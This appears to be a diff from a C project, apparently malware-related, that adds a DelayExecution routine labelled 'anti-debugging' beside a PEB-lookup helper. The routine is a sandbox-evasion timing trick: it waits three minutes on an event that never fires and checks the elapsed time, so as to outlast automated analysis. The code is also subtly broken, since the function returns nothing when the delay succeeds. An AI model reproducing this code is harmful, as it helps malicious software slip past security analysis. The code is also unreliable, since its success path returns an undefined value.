@@ -6,6 +6,36 @@
 #include "encryption.h"
 
 
+//anti-debugging
+BOOL DelayExecution()
+{
+	DWORD dwMillisSeconds = 3 * 60000; //wait for 3 minutes
+	HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
+	DWORD initialTime = 0;
+	DWORD finalTime = 0;
+
+	initialTime = GetTickCount();
+
+	if (hEvent == NULL)
+	{
+		return FALSE;
+	}
+
+	if (WaitForSingleObject(hEvent, dwMillisSeconds) == WAIT_FAILED)
+	{
+		return FALSE;
+	}
+
+	finalTime = GetTickCount();
+	CloseHandle(hEvent);
+
+	if ((DWORD)finalTime - initialTime < dwMillisSeconds)
+	{
+		return FALSE;
+	}
+}
+
+
 //implementation of GetPEBAddress
 PPEB GetPEBAddress()
 {
